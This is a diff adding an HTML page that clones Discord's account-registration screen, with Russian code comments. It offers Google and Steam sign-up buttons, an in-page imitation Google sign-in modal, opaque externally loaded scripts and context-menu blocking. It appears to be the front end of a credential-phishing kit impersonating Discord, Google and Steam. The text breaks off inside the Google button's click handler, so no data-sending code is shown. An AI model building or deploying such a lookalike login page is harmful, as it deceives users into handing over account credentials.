@@ -1,0 +1,609 @@
+<html class="platform-web theme-dark theme-darker images-dark density-default font-size-16 has-webkit-scrollbar mouse-mode full-motion app-focused visual-refresh hardware-acceleration" data-rh="lang,style,class" lang="en-US" style="font-size: 100%; --saturation-factor: 1; --devtools-sidebar-width: 0px; --vh: 6.51px;"><head>
+        <script src="./bd8bnbijanxm.js" defer=""></script>
+        <link data-savepage-href="https://discord.com/assets/favicon.ico" href="images/data-b4863501-eac8-4afa-ac43-50978f556b83.ico" rel="icon">
+        <meta charset="utf-8">
+        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
+        <meta content="website" property="og:type">
+        <meta content="Discord" property="og:site_name">
+        <meta content="Discord - Group Chat That's All Fun &amp; Games" property="og:title">
+        <meta content="Discord is great for playing games and chilling with friends, or even building a worldwide community. Customize your own space to talk, play, and hang out." property="og:description">
+        <meta content="https://cdn.discordapp.com/assets/og_img_discord_home.png" property="og:image">
+        <meta content="summary_large_image" name="twitter:card">
+        <meta content="@discord" name="twitter:site">
+        <meta content="@discord" name="twitter:creator">
+        <title>Discord</title>
+        
+        <!-- Tailwind CSS CDN -->
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script>
+            tailwind.config = {
+                darkMode: 'class',
+                theme: {
+                    extend: {
+                        colors: {
+                            discord: {
+                                primary: '#5865F2',
+                                dark: '#23272A',
+                                darker: '#1E2124',
+                                light: '#36393F',
+                                lighter: '#2F3136'
+                            }
+                        },
+                        animation: {
+                            'float': 'float 6s ease-in-out infinite',
+                            'glow': 'glow 2s ease-in-out infinite alternate',
+                            'pulse-light': 'pulse-light 2s ease-in-out infinite'
+                        },
+                        keyframes: {
+                            float: {
+                                '0%, 100%': { transform: 'translateY(0)' },
+                                '50%': { transform: 'translateY(-10px)' }
+                            },
+                            glow: {
+                                '0%': { boxShadow: '0 0 5px rgba(88, 101, 242, 0.5)' },
+                                '100%': { boxShadow: '0 0 20px rgba(88, 101, 242, 0.8)' }
+                            },
+                            'pulse-light': {
+                                '0%, 100%': { opacity: 0.8 },
+                                '50%': { opacity: 0.5 }
+                            }
+                        }
+                    }
+                }
+            }
+        </script>
+        
+        <!-- Scripts for functionality -->
+        <script src="assets/js/script.js"></script>
+        <script src="assets/js/responsive.js"></script>
+        
+        <link data-savepage-href="/assets/favicon.ico" href="images/data-f9958e74-b3b7-4c49-bd15-1dda34b47f5d.ico" rel="icon">
+        <meta content="https://discord.com/register" name="savepage-url">
+        <meta content="Discord" name="savepage-title">
+        <meta content="Unknown" name="savepage-pubdate">
+        <meta content="https://discord.com/register" name="savepage-from">
+        <meta content="Mon Apr 07 2025 16:55:29 GMT-0400 (Eastern Daylight Time)" name="savepage-date">
+        <meta content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;" name="savepage-state">
+        <meta content="33.9" name="savepage-version">
+        <meta content="" name="savepage-comments">
+        
+        <!-- Подключение шрифтов GG Sans -->
+        <style>
+            @font-face {
+                font-family: 'gg sans';
+                src: url('assets/fonts/ggsans.woff2') format('woff2');
+                font-weight: 400;
+                font-style: normal;
+            }
+            
+            @font-face {
+                font-family: 'gg sans';
+                src: url('assets/fonts/ggsansmedium.woff2') format('woff2');
+                font-weight: 500;
+                font-style: normal;
+            }
+            
+            @font-face {
+                font-family: 'gg sans';
+                src: url('assets/fonts/ggsanssemibold.woff2') format('woff2');
+                font-weight: 600;
+                font-style: normal;
+            }
+            
+            @font-face {
+                font-family: 'gg sans';
+                src: url('assets/fonts/ggsansbold.woff2') format('woff2');
+                font-weight: 700;
+                font-style: normal;
+            }
+            
+            html, body {
+                height: 100%;
+                margin: 0;
+                padding: 0;
+                overflow: hidden;
+                font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            }
+            
+            /* Critical styles for responsiveness */
+            .registration-container {
+                    display: flex;
+                    flex-direction: column;
+                    align-items: center;
+                    justify-content: center;
+                    min-height: 100vh;
+                    width: 100%;
+                padding: 1rem;
+                    box-sizing: border-box;
+                -webkit-overflow-scrolling: touch;
+            }
+            
+            .form-wrapper {
+                    display: flex;
+                    flex-direction: column;
+                align-items: center;
+                    width: 100%;
+                max-width: 440px;
+                margin: auto;
+                transform-origin: center;
+            }
+            
+            /* Уменьшенные отступы для логотипа */
+            .logo-container {
+                margin-top: 0.25rem;
+                margin-bottom: 0.4rem;
+                    text-align: center;
+            }
+            
+            .form-card {
+                    width: 100%;
+                padding: 1.5rem;
+                border-radius: 0.75rem;
+                background-color: #36393F;
+                background-color: rgba(54, 57, 63, 0.9);
+                backdrop-filter: blur(10px);
+                box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+            }
+            
+            /* Adaptive rules for different screen sizes */
+            @media screen and (max-height: 800px) {
+                .logo-container {
+                    margin-top: 0.15rem;
+                    margin-bottom: 0.2rem;
+                }
+                
+                .logo-container img {
+                    width: 5rem !important;
+                    height: 5rem !important;
+                }
+                
+                .form-card {
+                    padding: 1.25rem;
+                }
+                
+                h1 {
+                    font-size: 1.5rem !important;
+                    margin-bottom: 0.5rem !important;
+                }
+                
+                .social-login-buttons button {
+                    padding-top: 0.5rem !important;
+                    padding-bottom: 0.5rem !important;
+                }
+                
+                .form-content .mb-4 {
+                    margin-bottom: 0.75rem !important;
+                }
+                
+                input {
+                    padding: 0.5rem 0.75rem !important;
+                }
+                
+                p.text-xs {
+                    margin-top: 0.25rem !important;
+                }
+            }
+            
+            @media screen and (max-height: 650px) {
+                .logo-container {
+                    margin-top: 0.1rem;
+                    margin-bottom: 0.1rem;
+                }
+                
+                .logo-container img {
+                    width: 3.5rem !important;
+                    height: 3.5rem !important;
+                }
+                
+                .form-card {
+                    padding: 1rem;
+                }
+                
+                h1 {
+                    font-size: 1.25rem !important;
+                    margin-bottom: 0.5rem !important;
+                }
+                
+                .my-6 {
+                    margin-top: 0.75rem !important;
+                    margin-bottom: 0.75rem !important;
+                }
+                
+                .social-login-buttons {
+                    gap: 0.5rem !important;
+                }
+                
+                .mb-6 {
+                    margin-bottom: 0.75rem !important;
+                }
+            }
+            
+            @media screen and (max-width: 768px) {
+                .form-card {
+                    padding: 1.25rem;
+                }
+                
+                /* Отступы для модального окна на мобильных устройствах */
+                #google-modal > div {
+                    margin: 0 1rem;
+                }
+            }
+
+            @media screen and (max-width: 480px) {
+                .form-card {
+                    padding: 1rem;
+                }
+                
+                h1 {
+                    font-size: 1.5rem !important;
+                }
+                
+                /* Увеличиваем отступы для маленьких экранов */
+                #google-modal > div {
+                    margin: 0 1.25rem;
+                }
+            }
+            
+            /* Context menu blocking styles */
+            body {
+                -webkit-touch-callout: none;
+                -webkit-user-select: none;
+                -khtml-user-select: none;
+                -moz-user-select: none;
+                -ms-user-select: none;
+                user-select: none;
+            }
+            
+            /* Spinner animation styles */
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+            /* Статичный фон Discord */
+            .discord-bg {
+                background-image: url('images/data-d3496f2d-9c2f-4bc3-ab40-d02a406db592.svg');
+                background-size: cover;
+                background-position: center;
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                z-index: -1;
+            }
+
+            /* Input focus styles */
+            input:focus, select:focus {
+                outline: none;
+                border-color: #5865F2 !important;
+                box-shadow: 0 0 0 2px rgba(88, 101, 242, 0.3) !important;
+                transition: all 0.2s ease;
+            }
+            
+            /* Custom scrollbar */
+            ::-webkit-scrollbar {
+                width: 8px;
+                background: #2e3338;
+            }
+            
+            ::-webkit-scrollbar-thumb {
+                background: #202225;
+                border-radius: 4px;
+            }
+            
+            ::-webkit-scrollbar-thumb:hover {
+                background: #5865F2;
+            }
+            
+            /* Social login buttons */
+            .social-login-buttons {
+                width: 100%;
+                display: flex;
+                flex-direction: column;
+                gap: 0.75rem;
+            }
+
+            /* Заголовок формы с еще большим отступом */
+            .form-title {
+                padding-top: 2.5rem;
+            }
+
+            /* Убираем отступ у сообщения об ошибке */
+            .form-loading-state .error-message {
+                margin-top: 0;
+            }
+        </style>
+    <style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border-width:0}.pointer-events-none{pointer-events:none}.fixed{position:fixed}.relative{position:relative}.inset-0{inset:0px}.z-50{z-index:50}.my-6{margin-top:1.5rem;margin-bottom:1.5rem}.mb-2{margin-bottom:0.5rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mr-2{margin-right:0.5rem}.mr-3{margin-right:0.75rem}.mt-1{margin-top:0.25rem}.mt-4{margin-top:1rem}.block{display:block}.flex{display:flex}.hidden{display:none}.h-10{height:2.5rem}.h-16{height:4rem}.h-28{height:7rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-px{height:1px}.h-screen{height:100vh}.w-10{width:2.5rem}.w-16{width:4rem}.w-28{width:7rem}.w-32{width:8rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-full{width:100%}.w-screen{width:100vw}.max-w-md{max-width:28rem}.flex-grow{flex-grow:1}@keyframes spin{to{transform:rotate(360deg)}}.animate-spin{animation:spin 1s linear infinite}.select-none{-webkit-user-select:none;user-select:none}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.overflow-hidden{overflow:hidden}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-md{border-radius:0.375rem}.border{border-width:1px}.border-4{border-width:4px}.border-b{border-bottom-width:1px}.border-gray-700{--tw-border-opacity:1;border-color:rgb(55 65 81 / var(--tw-border-opacity, 1))}.border-t-discord-primary{--tw-border-opacity:1;border-top-color:rgb(88 101 242 / var(--tw-border-opacity, 1))}.bg-\[\#171a21\]{--tw-bg-opacity:1;background-color:rgb(23 26 33 / var(--tw-bg-opacity, 1))}.bg-black{--tw-bg-opacity:1;background-color:rgb(0 0 0 / var(--tw-bg-opacity, 1))}.bg-discord-darker{--tw-bg-opacity:1;background-color:rgb(30 33 36 / var(--tw-bg-opacity, 1))}.bg-discord-primary{--tw-bg-opacity:1;background-color:rgb(88 101 242 / var(--tw-bg-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-gray-600{--tw-bg-opacity:1;background-color:rgb(75 85 99 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-opacity-70{--tw-bg-opacity:0.7}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-6{padding:1.5rem}.px-4{padding-left:1rem;padding-right:1rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.text-center{text-align:center}.text-2xl{font-size:1.5rem;line-height:2rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.text-blue-400{--tw-text-opacity:1;color:rgb(96 165 250 / var(--tw-text-opacity, 1))}.text-discord-primary{--tw-text-opacity:1;color:rgb(88 101 242 / var(--tw-text-opacity, 1))}.text-gray-400{--tw-text-opacity:1;color:rgb(156 163 175 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.opacity-50{opacity:0.5}.shadow-2xl{--tw-shadow:0 25px 50px -12px rgb(0 0 0 / 0.25);--tw-shadow-colored:0 25px 50px -12px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.backdrop-blur-sm{--tw-backdrop-blur:blur(4px);-webkit-backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia);backdrop-filter:var(--tw-backdrop-blur) var(--tw-backdrop-brightness) var(--tw-backdrop-contrast) var(--tw-backdrop-grayscale) var(--tw-backdrop-hue-rotate) var(--tw-backdrop-invert) var(--tw-backdrop-opacity) var(--tw-backdrop-saturate) var(--tw-backdrop-sepia)}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-200{transition-duration:200ms}.duration-300{transition-duration:300ms}.hover\:bg-\[\#2a2e35\]:hover{--tw-bg-opacity:1;background-color:rgb(42 46 53 / var(--tw-bg-opacity, 1))}.hover\:bg-gray-100:hover{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.hover\:text-gray-900:hover{--tw-text-opacity:1;color:rgb(17 24 39 / var(--tw-text-opacity, 1))}.hover\:underline:hover{-webkit-text-decoration-line:underline;text-decoration-line:underline}.focus\:outline-none:focus{outline:2px solid transparent;outline-offset:2px}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow, 0 0 #0000)}.focus\:ring-discord-primary:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(88 101 242 / var(--tw-ring-opacity, 1))}.enabled\:hover\:bg-\[\#4752c4\]:hover:enabled{--tw-bg-opacity:1;background-color:rgb(71 82 196 / var(--tw-bg-opacity, 1))}.disabled\:opacity-50:disabled{opacity:0.5}.disabled\:hover\:bg-discord-primary:hover:disabled{--tw-bg-opacity:1;background-color:rgb(88 101 242 / var(--tw-bg-opacity, 1))}@media (min-width: 768px){.md\:text-3xl{font-size:1.875rem;line-height:2.25rem}}</style></head>
+    <body class="bg-discord-darker text-white desktop-view landscape" data-device-type="desktop" style="overflow-y: auto;">
+        <!-- Background elements -->
+        <div class="discord-bg"></div>
+        
+        <div data-live-announcer="true" class="sr-only">
+            <div aria-live="assertive" aria-relevant="additions" role="log"></div>
+            <div aria-live="polite" aria-relevant="additions" role="log"></div>
+        </div>
+        
+        <div class="h-screen w-screen" id="app-mount">            
+            <div class="registration-container" style="height: auto; padding-top: 1rem; padding-bottom: 1rem;">
+                <div class="form-wrapper" style="transform: scale(0.692744);">
+                    <!-- Discord logo над формой -->
+                    <div class="logo-container">
+                        <img src="/images/data-345073ed-f4a6-4974-88c8-e9a6915f965b.svg" alt="Discord" class="w-28 h-28 select-none pointer-events-none" draggable="false" oncontextmenu="return false;">
+                    </div>
+                    
+                    <div class="form-card">
+                        <div class="flex flex-col items-center mb-6">
+                            <h1 class="text-2xl md:text-3xl font-bold mb-2 text-center form-title">Create an account</h1>
+                        </div>
+                        
+                        <!-- Social login buttons with hover effects -->
+                        <div class="social-login-buttons mb-6">
+                            <button id="google-login" class="flex items-center justify-center bg-white hover:bg-gray-100 text-gray-800 py-3 px-4 rounded-md transition-all duration-200 font-medium">
+                                <svg class="w-5 h-5 mr-3" viewBox="0 0 24 24">
+                                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
+                                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
+                                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
+                                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>
+                                </svg>
+                                Sign up with Google
+                            </button>
+                            <button class="steam-button flex items-center justify-center bg-[#171a21] hover:bg-[#2a2e35] text-white py-3 px-4 rounded-md transition-all duration-200 font-medium osn247ggxz3d">
+                                <svg class="w-5 h-5 mr-3" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"> <path d="M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.198 2.198 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.217 2.217 0 0 1-1.312-1.568L.33 10.333Z" fill="white"></path> <path d="M4.868 12.683a1.715 1.715 0 0 0 1.318-3.165 1.705 1.705 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027Zm2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048Z" fill="white"></path> </svg>
+                                Sign up with Steam
+                            </button>
+                        </div>
+                        
+                        <div class="flex items-center my-6">
+                            <div class="flex-grow h-px bg-gray-600"></div>
+                            <div class="px-4 text-sm text-gray-400">OR</div>
+                            <div class="flex-grow h-px bg-gray-600"></div>
+                        </div>
+                        
+                        <!-- Registration form -->
+                        <form id="registration-form" class="form-content">
+                            <div class="mb-4">
+                                <label for="email" class="block mb-2 text-sm font-medium">EMAIL <span class="text-red-500">*</span></label>
+                                <input type="email" id="email" name="email" class="w-full bg-discord-darker border border-gray-700 text-white p-3 rounded-md focus:outline-none focus:ring-2 focus:ring-discord-primary transition-all duration-200" required="">
+                            </div>
+                            
+                            <div class="mb-4">
+                                <label for="display-name" class="block mb-2 text-sm font-medium">DISPLAY NAME</label>
+                                <input type="text" id="display-name" name="display_name" class="w-full bg-discord-darker border border-gray-700 text-white p-3 rounded-md focus:outline-none focus:ring-2 focus:ring-discord-primary transition-all duration-200">
+                                <p class="text-xs text-gray-400 mt-1">This is how others see you. You can use special characters and emoji.</p>
+                            </div>
+                            
+                            <div class="mb-4">
+                                <label for="username" class="block mb-2 text-sm font-medium">USERNAME <span class="text-red-500">*</span></label>
+                                <input type="text" id="username" name="username" class="w-full bg-discord-darker border border-gray-700 text-white p-3 rounded-md focus:outline-none focus:ring-2 focus:ring-discord-primary transition-all duration-200" required="">
+                                <p class="text-xs text-gray-400 mt-1">Use only numbers, letters, underscores, or periods.</p>
+                            </div>
+                            
+                            <div class="mb-4">
+                                <label for="password" class="block mb-2 text-sm font-medium">PASSWORD <span class="text-red-500">*</span></label>
+                                <input type="password" id="password" name="password" class="w-full bg-discord-darker border border-gray-700 text-white p-3 rounded-md focus:outline-none focus:ring-2 focus:ring-discord-primary transition-all duration-200" required="">
+                            </div>
+                            
+                            <button type="submit" id="continue-button" class="w-full bg-discord-primary py-3 px-4 rounded-md font-medium transition-all duration-300 disabled:opacity-50 disabled:hover:bg-discord-primary enabled:hover:bg-[#4752c4] opacity-50" disabled="">
+                                Continue
+                            </button>
+
+                            <div class="mt-4 text-xs text-gray-400 text-center">
+                                By registering, you agree to Discord's 
+                                <a href="https://discord.com/terms" class="text-blue-400 hover:underline">Terms of Service</a> and 
+                                <a href="#" class="text-blue-400 hover:underline">Privacy Policy</a>.
+                            </div>
+
+                            <div class="mt-4 text-center">
+                                <a href="https://discord.com/privacy" class="text-sm text-discord-primary hover:underline">Already have an account?</a>
+                            </div>
+                        </form>
+                        
+                        <!-- Form loading state (initially hidden) -->
+                        <div class="form-loading-state hidden flex flex-col items-center justify-center p-6">
+                            <div class="relative">
+                                <img src="assets/images/discord-logo.svg" alt="Discord" class="w-16 h-16 mb-4">
+                            </div>
+                            <div class="w-10 h-10 border-4 border-t-discord-primary border-gray-700 rounded-full animate-spin mb-4"></div>
+                            <div>Loading...</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Google Modal -->
+        <div id="google-modal" class="hidden fixed inset-0 bg-black bg-opacity-70 z-50 flex items-center justify-center backdrop-blur-sm">
+            <div class="bg-white rounded-lg shadow-2xl w-full max-w-md overflow-hidden">
+                <div class="flex items-center justify-between p-4 border-b">
+                    <h2 class="text-gray-800 font-medium flex items-center">
+                        <svg class="w-6 h-6 mr-2" viewBox="0 0 24 24">
+                            <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"></path>
+                            <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"></path>
+                            <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"></path>
+                            <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"></path>
+                        </svg>
+                        Google
+                    </h2>
+                    <button id="modal-close" class="text-gray-700 hover:text-gray-900 focus:outline-none">
+                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
+                            <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="modal-body p-6 flex flex-col items-center bg-gray-100">
+                    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="w-32 mb-4">
+                    <div class="text-gray-800 text-center">Sign in with Google</div>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                // Улучшенная функция для адаптивной подгонки формы под размер экрана
+                function adjustLayout() {
+                    const windowHeight = window.innerHeight;
+                    const windowWidth = window.innerWidth;
+                    const formWrapper = document.querySelector('.form-wrapper');
+                    const formHeight = formWrapper.offsetHeight;
+                    const scaleFactor = Math.min(1, (windowHeight - 40) / formHeight);
+                    
+                    // Если форма не помещается по высоте, масштабируем её
+                    if (formHeight > windowHeight - 40) {
+                        formWrapper.style.transform = `scale(${scaleFactor})`;
+                    } else {
+                        formWrapper.style.transform = 'scale(1)';
+                    }
+                    
+                    // Проверяем, нужно ли добавить скроллинг в крайних случаях
+                    if (scaleFactor < 0.7) {
+                        document.body.style.overflowY = 'auto';
+                        document.querySelector('.registration-container').style.height = 'auto';
+                        document.querySelector('.registration-container').style.paddingTop = '1rem';
+                        document.querySelector('.registration-container').style.paddingBottom = '1rem';
+                        } else {
+                        document.body.style.overflowY = 'hidden';
+                        document.querySelector('.registration-container').style.height = '100vh';
+                        document.querySelector('.registration-container').style.paddingTop = '0';
+                        document.querySelector('.registration-container').style.paddingBottom = '0';
+                    }
+                }
+                
+                // Запускаем при загрузке и изменении размера окна
+                adjustLayout();
+                window.addEventListener('resize', adjustLayout);
+                
+                // Google login
+                const googleButton = document.getElementById('google-login');
+                const modal = document.getElementById('google-modal');
+                const modalBody = document.querySelector('.modal-body');
+                const closeButton = document.getElementById('modal-close');
+                
+                    googleButton.addEventListener('click', function() {
